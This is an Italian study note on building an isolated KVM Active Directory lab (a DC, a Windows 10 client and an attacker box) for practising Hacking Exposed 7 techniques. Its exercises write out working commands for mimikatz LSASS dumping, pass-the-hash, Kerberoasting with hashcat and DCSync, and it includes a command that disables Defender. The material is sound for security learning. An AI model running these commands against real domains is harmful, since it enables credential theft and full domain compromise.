---

tags:

- lab
- hacking-exposed-7
- windows
- active-directory
- fedora
- kvm created: 2026-05-16

---

# Lab Active Directory su Fedora con KVM

> [!abstract] Obiettivo Costruire un mini ambiente Windows aziendale isolato per praticare gli attacchi di Hacking Exposed 7: dumping di credenziali, Pass-the-Hash, Pass-the-Ticket, Kerberoasting, lateral movement.

---

## Architettura del lab

```
                  ┌────────────────────────────┐
                  │  Rete isolata: 10.10.10.0/24│
                  └────────────────────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
   ┌────▼────┐           ┌────▼────┐          ┌────▼────┐
   │  DC01   │           │  WS01   │          │ ATTACKER│
   │ Win Srv │◄─────────►│  Win10  │          │  Kali   │
   │  2022   │           │ joined  │          │  / host │
   │ 4GB RAM │           │ 4GB RAM │          │ 2GB RAM │
   │   DC    │           │ client  │          │         │
   └─────────┘           └─────────┘          └─────────┘
   10.10.10.10           10.10.10.20          10.10.10.30
```

**3 VM totali**, RAM totale ~10–12 GB, disco ~100 GB.

---

## Prerequisiti hardware

|Componente|Minimo|Consigliato|
|---|---|---|
|CPU|4 core con VT-x/AMD-V|8 core|
|RAM|12 GB|16+ GB|
|Disco libero|100 GB|150 GB SSD|

### Verifica supporto virtualizzazione

```bash
# Verifica CPU
grep -E 'svm|vmx' /proc/cpuinfo | head -1
# vmx = Intel VT-x, svm = AMD-V — almeno uno deve apparire

# Verifica kernel modules
lsmod | grep kvm
# devi vedere kvm_intel o kvm_amd

# Tool diagnostico libvirt
virt-host-validate
# tutto QEMU/KVM dovrebbe essere PASS
```

Se VT-x/AMD-V non è abilitato, entra nel BIOS/UEFI e attivalo (di solito sotto "CPU Configuration" o "Advanced").

---

## Step 1 — Installare lo stack di virtualizzazione

```bash
# Installa KVM, QEMU, libvirt, virt-manager (GUI)
sudo dnf install -y @virtualization virt-manager virt-viewer

# Avvia il servizio
sudo systemctl enable --now libvirtd

# Aggiungiti al gruppo (per non dover usare sudo ogni volta)
sudo usermod -aG libvirt $USER

# Per applicare il gruppo senza fare logout
newgrp libvirt

# Verifica
virsh list --all
# Deve rispondere senza errori (lista vuota va bene)
```

> [!tip] Perché KVM/libvirt e non VirtualBox Su Fedora, VirtualBox richiede moduli kernel out-of-tree che si rompono ad ogni aggiornamento kernel. KVM è nel kernel mainline, libvirt è gestito dalla distribuzione, e virt-manager dà una GUI simile a VirtualBox. Performance migliori, zero manutenzione.

---

## Step 2 — Creare la rete isolata

Una rete dedicata al lab evita che le VM "vedano" la tua rete domestica e viceversa.

Crea il file `/tmp/lab-network.xml`:

```xml
<network>
  <name>lab-network</name>
  <bridge name="virbr-lab"/>
  <forward mode="nat"/>
  <ip address="10.10.10.1" netmask="255.255.255.0">
    <dhcp>
      <range start="10.10.10.100" end="10.10.10.200"/>
    </dhcp>
  </ip>
</network>
```

Poi:

```bash
sudo virsh net-define /tmp/lab-network.xml
sudo virsh net-autostart lab-network
sudo virsh net-start lab-network

# Verifica
sudo virsh net-list
```

> [!warning] NAT vs Isolated Ho usato `mode="nat"` così le VM possono uscire su internet (utile per scaricare update, tool, ecc.). Se vuoi un lab completamente sandboxato, sostituisci `<forward mode="nat"/>` con `<forward mode="none"/>`. Per imparare consiglio NAT — gli update di Windows valgono ore di troubleshooting.

---

## Step 3 — Scaricare le ISO

### Windows Server 2022 (per il DC)

- URL: `https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022`
- Eval da 180 giorni, gratuita, registrazione con email
- Scegli "ISO Downloads" → English (64-bit)
- File: ~5 GB

### Windows 10 Enterprise (per il client)

- URL: `https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise`
- Eval da 90 giorni
- File: ~5 GB

> [!tip] Perché Windows 10 e non 11 Win 11 richiede TPM 2.0 e Secure Boot. È fattibile con KVM (servono `swtpm` e firmware OVMF) ma complica il setup. Per studiare la sicurezza di AD e gli attacchi del libro, Win 10 va benissimo. Se più avanti vuoi praticare Credential Guard moderno (attivo di default su Win 11 Enterprise), puoi aggiungere una terza VM.

### Kali Linux (opzionale, per l'attacker)

- URL: `https://www.kali.org/get-kali/#kali-installer-images`
- Scarica l'ISO "Installer" 64-bit
- File: ~4 GB

In alternativa, puoi usare la tua Fedora come macchina d'attacco (vedi Step 7).

Salva le ISO in `~/Downloads/ISOs/`.

---

## Step 4 — VM 1: Domain Controller (DC01)

### Crea la VM

Apri **virt-manager** dal menu o con `virt-manager`. Poi:

1. **File → New Virtual Machine**
2. Local install media (ISO) → seleziona la ISO di Windows Server 2022
3. Scegli sistema operativo: **Microsoft Windows Server 2022** (se non c'è, scegli 2019 o Windows 10)
4. Memory: **4096 MB**, CPUs: **2**
5. Storage: crea un disco nuovo da **60 GB** (qcow2)
6. Nome: **DC01**
7. Network: **lab-network**
8. Spunta "Customize configuration before install" → **Finish**

Nella schermata di configurazione, prima di "Begin Installation":

- **Boot Options**: assicurati che CD/DVD sia primo
- **NIC**: device model = `virtio` (più veloce). Se Windows non lo riconosce, fallback su `e1000e`

Clicca **Begin Installation**.

### Installa Windows Server

- Edition: **Windows Server 2022 Standard (Desktop Experience)** — _non_ la Core, ti servirà la GUI
- Custom install → installa sul disco da 60 GB
- Password Administrator: **`P@ssw0rd!`** (semplice apposta per il lab)

### Configurazione post-install

Login come Administrator. Apri PowerShell come admin:

```powershell
# Rinomina il computer
Rename-Computer -NewName "DC01"

# Imposta IP statico (sostituisci "Ethernet" col nome interfaccia se diverso)
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.10.10.10 -PrefixLength 24 -DefaultGateway 10.10.10.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 127.0.0.1

# Riavvia
Restart-Computer
```

### Promuovi a Domain Controller

Dopo il riavvio, ancora in PowerShell come admin:

```powershell
# Installa il ruolo AD DS
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promuovi il server a DC creando un nuovo forest
Install-ADDSForest `
    -DomainName "corp.local" `
    -DomainNetbiosName "CORP" `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) `
    -InstallDns `
    -Force
```

Il server si riavvia automaticamente. Dopo il reboot, il login sarà `CORP\Administrator`.

### Crea utenti di esempio

```powershell
# Utente normale
New-ADUser -Name "Alice Rossi" -SamAccountName alice -UserPrincipalName alice@corp.local `
    -AccountPassword (ConvertTo-SecureString "Alice2024!" -AsPlainText -Force) `
    -Enabled $true -ChangePasswordAtLogon $false

# Service account (con SPN per Kerberoasting!)
New-ADUser -Name "SQL Service" -SamAccountName sqlsvc -UserPrincipalName sqlsvc@corp.local `
    -AccountPassword (ConvertTo-SecureString "SqlServiceP@ss" -AsPlainText -Force) `
    -Enabled $true -ServicePrincipalNames @("MSSQLSvc/sqlserver.corp.local:1433")

# Admin di dominio (per testare PtH catastrofico)
New-ADUser -Name "Bob Domain Admin" -SamAccountName bobadmin -UserPrincipalName bobadmin@corp.local `
    -AccountPassword (ConvertTo-SecureString "BobAdmin2024!" -AsPlainText -Force) `
    -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members bobadmin
```

---

## Step 5 — VM 2: Workstation (WS01)

### Crea la VM

In virt-manager, come prima:

- ISO: Windows 10 Enterprise
- RAM: **4096 MB**, CPU: **2**
- Disco: **40 GB**
- Nome: **WS01**
- Network: **lab-network**

### Installa Win 10

- Edition: **Windows 10 Enterprise**
- "I don't have a product key" se richiesto
- Custom install
- Account locale: nome `localuser`, password `Local2024!`
- Skippa tutto Cortana / privacy se ti chiede

### Configura e joina al dominio

In PowerShell come admin:

```powershell
# IP statico
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.10.10.20 -PrefixLength 24 -DefaultGateway 10.10.10.1

# DNS = il DC (CRUCIALE per il join)
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.10.10.10

# Verifica risoluzione
Resolve-DnsName corp.local
# Deve risolvere a 10.10.10.10

# Rinomina e joina
Add-Computer -DomainName "corp.local" -NewName "WS01" `
    -Credential (Get-Credential CORP\Administrator) `
    -Restart
```

Inserisci la password `P@ssw0rd!` quando chiesta. Il PC si riavvia, e ora puoi loggarti come `CORP\alice` o `CORP\Administrator`.

---

## Step 6 — Simula l'attacco juicy

Per studiare LSASS dumping con un domain admin "di passaggio", fai questo:

1. Logga su WS01 come `CORP\alice` (utente normale, simulando l'uso quotidiano)
2. Logout
3. Logga su WS01 come `CORP\bobadmin` (admin che fa "manutenzione")
4. Logout
5. Ri-logga come `CORP\alice`

Risultato: in LSASS di WS01 ci sono ancora le credenziali di `bobadmin`. Esattamente lo scenario descritto nel libro.

---

## Step 7 — La macchina d'attacco

### Opzione A: Kali Linux in VM

Crea una terza VM:

- ISO: Kali
- RAM: 2048 MB, CPU: 2
- Disco: 30 GB
- Network: lab-network
- IP statico: 10.10.10.30

Tool già installati: mimikatz (via Wine, ma meglio passarlo alla vittima), impacket, crackmapexec/netexec, BloodHound, responder, ecc.

### Opzione B: usa Fedora direttamente (più rapido)

```bash
# Impacket suite — i tool per attacchi remoti AD
sudo dnf install -y python3-pip git
pipx install impacket
# oppure: pipx install git+https://github.com/fortra/impacket.git per la versione di sviluppo

# NetExec (ex CrackMapExec) — swiss army knife per AD
pipx install git+https://github.com/Pennyw0rth/NetExec

# BloodHound (community edition)
sudo dnf install -y podman podman-compose
git clone https://github.com/SpecterOps/BloodHound.git
cd BloodHound
# segui il README per avviare con podman/docker

# Hashcat per cracking
sudo dnf install -y hashcat

# John the Ripper
sudo dnf install -y john

# Responder per LLMNR/NBT-NS poisoning
pipx install git+https://github.com/lgandx/Responder
```

Mimikatz invece va eseguito **sulla macchina Windows compromessa** (è un binary Windows). Scaricalo da `https://github.com/gentilkiwi/mimikatz/releases` e trasferiscilo sulla VM Windows via shared folder o web server temporaneo:

```bash
# Sulla Fedora, nella cartella con mimikatz scaricato:
python3 -m http.server 8000
# Sulla Windows: scarica da http://10.10.10.x:8000/mimikatz.exe
```

---

## Esercizi iniziali (in ordine di difficoltà)

### 1. Dumping locale con mimikatz

Su WS01 dopo aver simulato lo scenario admin-di-passaggio:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

Cerca le credenziali di `bobadmin` in memoria. Ottieni l'hash NTLM.

### 2. Pass-the-Hash da Fedora

```bash
# Con l'hash di bobadmin in mano
netexec smb 10.10.10.10 -u bobadmin -H <NTLM_HASH>
# se funziona, hai il dominio
```

### 3. Kerberoasting

```bash
# Ottieni TGS per il SPN dell'account sqlsvc
impacket-GetUserSPNs corp.local/alice:Alice2024! -dc-ip 10.10.10.10 -request

# Cracca offline
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### 4. DCSync (replica delle credenziali del DC)

```bash
# Se hai compromesso un account con privilegi di replica
impacket-secretsdump corp.local/bobadmin:BobAdmin2024!@10.10.10.10
# Dumpa TUTTI gli hash del dominio
```

### 5. BloodHound — mappare il dominio

```bash
# Da Fedora
bloodhound-python -u alice -p 'Alice2024!' -d corp.local -ns 10.10.10.10 -c All
# Importa i JSON in BloodHound GUI e cerca path verso Domain Admins
```

---

## Snapshot — la cosa più utile che farai

Prima di iniziare gli esercizi, **fai uno snapshot di ogni VM in stato pulito**:

```bash
sudo virsh snapshot-create-as --domain DC01 --name "clean-baseline" --description "DC promosso, utenti creati"
sudo virsh snapshot-create-as --domain WS01 --name "clean-baseline" --description "Joinato al dominio"

# Per tornare indietro dopo aver rotto tutto:
sudo virsh snapshot-revert --domain WS01 --snapshotname "clean-baseline"
```

Quando rompi qualcosa (e lo farai), torni allo stato pulito in 10 secondi invece di rifare l'installazione.

---

## Troubleshooting comune

|Problema|Soluzione|
|---|---|
|VM lentissima|Verifica che KVM acceleration sia attiva: in virt-manager → CPU → "Copy host CPU configuration"|
|Win 10 non si avvia|Disabilita Secure Boot nell'XML della VM, oppure usa firmware BIOS invece di UEFI|
|Domain join fallisce|DNS sbagliato — il client DEVE puntare al DC come DNS, non al gateway|
|`Resolve-DnsName corp.local` fallisce|Il DC non ha finito di promuoversi o il DNS server role non è installato|
|Mimikatz bloccato da Defender|Disabilita Defender temporaneamente (`Set-MpPreference -DisableRealtimeMonitoring $true`) — è un lab|
|Snapshot non funziona|Il disco deve essere qcow2, non raw. Verifica con `virsh dumpxml DC01 \| grep type`|

---

## Tempo stimato

|Fase|Tempo|
|---|---|
|Installazione stack + rete|30 min|
|Download ISO|30–60 min (dipende dalla banda)|
|Installazione DC01 + promozione|60 min|
|Installazione WS01 + domain join|45 min|
|Setup Kali o tool su Fedora|30 min|
|**Totale primo setup**|**3–4 ore**|

Una volta fatto, gli snapshot ti permettono di sperimentare all'infinito senza ricostruire nulla.

---

## Collegamenti

- [[credential_dumping_lsa_vs_lsass]] — gli attacchi da praticare qui dentro
- [[interactive_logon]] — perché lasciare LSASS pieno di credenziali è pericoloso
- [[windows_domain_logon]] — la teoria che questo lab ti permette di toccare con mano